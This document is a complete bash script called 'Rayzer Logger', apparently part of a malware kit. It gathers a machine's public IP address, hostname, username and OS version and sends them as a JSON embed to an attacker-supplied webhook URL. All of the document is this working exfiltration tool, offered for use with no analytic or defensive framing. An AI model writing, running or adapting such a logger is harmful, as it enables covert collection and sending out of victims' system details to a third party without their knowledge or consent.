#!/bin/bash
# /source codes/execution/rayzer.sh

WEBHOOK_URL="PUT_WEBHOOK_HERE"

if [ "$WEBHOOK_URL" == "PUT_WEBHOOK_HERE" ]; then
    echo "Error: Webhook URL not set!"
    exit 1
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
HOSTNAME=$(hostname)
USER=$(whoami)
OS=$(uname -sr)

PAYLOAD=$(cat <<EOF
{
  "username": "Rayzer Logger",
  "embeds": [{
    "title": "New Log",
    "color": 3447003,
    "fields": [
      { "name": "IP", "value": "\`$IP\`", "inline": true },
      { "name": "Machine", "value": "\`$HOSTNAME\`", "inline": true },
      { "name": "User", "value": "\`$USER\`", "inline": true },
      { "name": "OS", "value": "\`$OS\`", "inline": false }
    ],
    "footer": { "text": "Rayzer Logger" },
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  }]
}
EOF
)

curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$WEBHOOK_URL"
